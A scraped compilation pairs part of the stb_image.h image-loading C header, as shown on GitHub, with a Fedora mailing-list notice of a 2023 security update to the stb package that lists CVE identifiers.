#if defined(STBI\_MALLOC) && defined(STBI\_FREE) && (defined(STBI\_REALLOC) || defined(STBI\_REALLOC\_SIZED))// ok#elif !defined(STBI\_MALLOC) && !defined(STBI\_FREE) && !defined(STBI\_REALLOC) && !defined(STBI\_REALLOC\_SIZED)// ok#else#error "Must define all or none of STBI\_MALLOC, STBI\_FREE, and STBI\_REALLOC (or STBI\_REALLOC\_SIZED)."#endif
#ifndef STBI\_MALLOC#define STBI\_MALLOC(sz) malloc(sz)#define STBI\_REALLOC(p,newsz) realloc(p,newsz)#define STBI\_FREE(p) free(p)#endif
#ifndef STBI\_REALLOC\_SIZED#define STBI\_REALLOC\_SIZED(p,oldsz,newsz) STBI\_REALLOC(p,newsz)#endif
// x86/x64 detection#if defined(\_\_x86\_64\_\_) || defined(\_M\_X64)#define STBI\_\_X64\_TARGET#elif defined(\_\_i386) || defined(\_M\_IX86)#define STBI\_\_X86\_TARGET#endif
#if defined(\_\_GNUC\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(\_\_SSE2\_\_) && !defined(STBI\_NO\_SIMD)// gcc doesn't support sse2 intrinsics unless you compile with -msse2,// which in turn means it gets to use SSE2 everywhere. This is unfortunate,// but previous attempts to provide the SSE2 functions with runtime// detection caused numerous issues. The way architecture extensions are// exposed in GCC/Clang is, sadly, not really suited for one-file libs.// New behavior: if compiled with -msse2, we use SSE2 without any// detection; if not, we don't use it at all.#define STBI\_NO\_SIMD#endif
#if defined(\_\_MINGW32\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(STBI\_MINGW\_ENABLE\_SSE2) && !defined(STBI\_NO\_SIMD)// Note that \_\_MINGW32\_\_ doesn't actually mean 32-bit, so we have to avoid STBI\_\_X64\_TARGET//// 32-bit MinGW wants ESP to be 16-byte aligned, but this is not in the// Windows ABI and VC++ as well as Windows DLLs don't maintain that invariant.// As a result, enabling SSE2 on 32-bit MinGW is dangerous when not// simultaneously enabling "-mstackrealign".//// See https://github.com/nothings/stb/issues/81 for more information.//// So default to no SSE2 on 32-bit MinGW. If you've read this far and added// -mstackrealign to your build settings, feel free to #define STBI\_MINGW\_ENABLE\_SSE2.#define STBI\_NO\_SIMD#endif
#if !defined(STBI\_NO\_SIMD) && (defined(STBI\_\_X86\_TARGET) || defined(STBI\_\_X64\_TARGET))#define STBI\_SSE2#include <emmintrin.h>
#ifdef \_MSC\_VER
#if \_MSC\_VER >= 1400 // not VC6#include <intrin.h> // \_\_cpuidstatic int stbi\_\_cpuid3(void){ int info[4]; \_\_cpuid(info,1); return info[3];}#elsestatic int stbi\_\_cpuid3(void){ int res; \_\_asm { mov eax,1 cpuid mov res,edx } return res;}#endif
#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ int info3 = stbi\_\_cpuid3(); return ((info3 >> 26) & 1) != 0;}#endif
#else // assume GCC-style if not VC++#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ // If we're even attempting to compile this on GCC/Clang, that means // -msse2 is on, which means the compiler is allowed to use SSE2 // instructions at will, and so are we. return 1;}#endif
#endif#endif
// ARM NEON#if defined(STBI\_NO\_SIMD) && defined(STBI\_NEON)#undef STBI\_NEON#endif
#ifdef STBI\_NEON#include <arm\_neon.h>#ifdef \_MSC\_VER#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name#else#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))#endif#endif
#ifndef STBI\_SIMD\_ALIGN#define STBI\_SIMD\_ALIGN(type, name) type name#endif
#ifndef STBI\_MAX\_DIMENSIONS#define STBI\_MAX\_DIMENSIONS (1 << 24)#endif
/////////////////////////////////////////////////// stbi\_\_context struct and start\_xxx functions
// stbi\_\_context structure is our basic context used by all images, so it// contains all the IO context, plus some basic image informationtypedef struct{ stbi\_\_uint32 img\_x, img\_y; int img\_n, img\_out\_n;
 stbi\_io\_callbacks io; void \*io\_user\_data;
 int read\_from\_callbacks; int buflen; stbi\_uc buffer\_start[128]; int callback\_already\_read;
 stbi\_uc \*img\_buffer, \*img\_buffer\_end; stbi\_uc \*img\_buffer\_original, \*img\_buffer\_original\_end;} stbi\_\_context;
static void stbi\_\_refill\_buffer(stbi\_\_context \*s);
// initialize a memory-decode contextstatic void stbi\_\_start\_mem(stbi\_\_context \*s, stbi\_uc const \*buffer, int len){ s->io.read = NULL; s->read\_from\_callbacks = 0; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = (stbi\_uc \*) buffer; s->img\_buffer\_end = s->img\_buffer\_original\_end = (stbi\_uc \*) buffer+len;}
// initialize a callback-based contextstatic void stbi\_\_start\_callbacks(stbi\_\_context \*s, stbi\_io\_callbacks \*c, void \*user){ s->io = \*c; s->io\_user\_data = user; s->buflen = sizeof(s->buffer\_start); s->read\_from\_callbacks = 1; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = s->buffer\_start; stbi\_\_refill\_buffer(s); s->img\_buffer\_original\_end = s->img\_buffer\_end;}
#ifndef STBI\_NO\_STDIO
static int stbi\_\_stdio\_read(void \*user, char \*data, int size){ return (int) fread(data,1,size,(FILE\*) user);}
static void stbi\_\_stdio\_skip(void \*user, int n){ int ch; fseek((FILE\*) user, n, SEEK\_CUR); ch = fgetc((FILE\*) user); /\* have to read a byte to reset feof()'s flag \*/ if (ch != EOF) { ungetc(ch, (FILE \*) user); /\* push byte back onto stream if valid. \*/ }}
static int stbi\_\_stdio\_eof(void \*user){ return feof((FILE\*) user) || ferror((FILE \*) user);}
static stbi\_io\_callbacks stbi\_\_stdio\_callbacks ={ stbi\_\_stdio\_read, stbi\_\_stdio\_skip, stbi\_\_stdio\_eof,};
static void stbi\_\_start\_file(stbi\_\_context \*s, FILE \*f){ stbi\_\_start\_callbacks(s, &stbi\_\_stdio\_callbacks, (void \*) f);}
//static void stop\_file(stbi\_\_context \*s) { }
#endif // !STBI\_NO\_STDIO
static void stbi\_\_rewind(stbi\_\_context \*s){ // conceptually rewind SHOULD rewind to the beginning of the stream, // but we just rewind to the beginning of the initial buffer, because // we only use it after doing 'test', which only ever looks at at most 92 bytes s->img\_buffer = s->img\_buffer\_original; s->img\_buffer\_end = s->img\_buffer\_original\_end;}
enum{ STBI\_ORDER\_RGB, STBI\_ORDER\_BGR};
typedef struct{ int bits\_per\_channel; int num\_channels; int channel\_order;} stbi\_\_result\_info;
#ifndef STBI\_NO\_JPEGstatic int stbi\_\_jpeg\_test(stbi\_\_context \*s);static void \*stbi\_\_jpeg\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_jpeg\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNGstatic int stbi\_\_png\_test(stbi\_\_context \*s);static void \*stbi\_\_png\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_png\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_png\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_BMPstatic int stbi\_\_bmp\_test(stbi\_\_context \*s);static void \*stbi\_\_bmp\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_bmp\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_TGAstatic int stbi\_\_tga\_test(stbi\_\_context \*s);static void \*stbi\_\_tga\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_tga\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PSDstatic int stbi\_\_psd\_test(stbi\_\_context \*s);static void \*stbi\_\_psd\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri, int bpc);static int stbi\_\_psd\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_psd\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_HDRstatic int stbi\_\_hdr\_test(stbi\_\_context \*s);static float \*stbi\_\_hdr\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_hdr\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PICstatic int stbi\_\_pic\_test(stbi\_\_context \*s);static void \*stbi\_\_pic\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pic\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_GIFstatic int stbi\_\_gif\_test(stbi\_\_context \*s);static void \*stbi\_\_gif\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static void \*stbi\_\_load\_gif\_main(stbi\_\_context \*s, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);static int stbi\_\_gif\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNMstatic int stbi\_\_pnm\_test(stbi\_\_context \*s);static void \*stbi\_\_pnm\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pnm\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_pnm\_is16(stbi\_\_context \*s);#endif
static#ifdef STBI\_THREAD\_LOCALSTBI\_THREAD\_LOCAL#endifconst char \*stbi\_\_g\_failure\_reason;
STBIDEF const char \*stbi\_failure\_reason(void){ return stbi\_\_g\_failure\_reason;}
#ifndef STBI\_NO\_FAILURE\_STRINGSstatic int stbi\_\_err(const char \*str){ stbi\_\_g\_failure\_reason = str; return 0;}#endif
static void \*stbi\_\_malloc(size\_t size){ return STBI\_MALLOC(size);}
// stb\_image uses ints pervasively, including for offset calculations.// therefore the largest decoded image size we can support with the// current code, even on 64-bit targets, is INT\_MAX. this is not a// significant limitation for the intended use case.//// we do, however, need to make sure our size calculations don't// overflow. hence a few helper functions for size calculations that// multiply integers together, making sure that they're non-negative// and no overflow occurs.
// return 1 if the sum is valid, 0 on overflow.// negative terms are considered invalid.static int stbi\_\_addsizes\_valid(int a, int b)[View remainder of file in raw view](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_14ecefe6_20250111_100629.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO.mbox.gz?message=NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/#NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO)

# [SECURITY] Fedora 38 Update: stb-0^20231011gitbeebb24-12.fc38

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

4 Nov
2023

4 Nov
'23

3:42 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2023-d486d13cfd
2023-11-04 03:41:29.345861
--------------------------------------------------------------------------------

Name : stb
Product : Fedora 38
Version : 0^20231011gitbeebb24
Release : 12.fc38
URL : <https://github.com/nothings/stb>
Summary : Single-file public domain libraries for C/C++
Description :
Single-file public domain libraries for C/C++.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2023-45661 CVE-2023-45662 CVE-2023-45663 CVE-2023-45664
CVE-2023-45666 CVE-2023-45667 CVE-2023-45675 CVE-2023-43281
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-12
- stb\_vorbis: fix GHSL-2023-165 / fix CVE-2023-45675
